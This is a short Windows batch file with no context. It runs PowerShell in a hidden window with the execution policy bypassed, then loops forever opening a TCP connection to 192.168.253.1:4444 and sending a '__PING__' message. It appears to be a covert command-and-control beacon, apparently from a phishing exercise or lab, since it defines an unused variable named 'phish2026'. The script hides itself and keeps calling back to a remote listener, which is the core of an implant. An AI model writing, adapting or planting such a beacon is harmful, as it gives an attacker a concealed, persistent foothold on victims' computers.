@echo off
powershell -WindowStyle Hidden -Exec Bypass -Command "$h="192.168.253.1";$pt=4444;$k="phish2026";while(1){try{$c=New-Object Net.Sockets.TcpClient($h,$pt);$s=$c.GetStream();$m=[Text.Encoding]::UTF8.GetBytes("__PING__");$s.Write($m,0,$m.Length);$s.Flush();Start-Sleep 5;$c.Close()}catch{};Start-Sleep 30}"
